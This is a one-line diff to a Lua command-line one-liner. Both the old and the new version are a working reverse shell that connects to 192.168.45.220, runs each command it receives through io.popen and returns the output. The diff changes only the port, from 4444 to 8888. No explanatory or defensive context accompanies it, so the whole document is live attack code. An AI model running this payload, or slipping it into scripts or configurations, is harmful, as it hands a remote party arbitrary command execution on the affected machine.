@@ -1,1 +1,1 @@
-lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.220',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
+lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.220',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
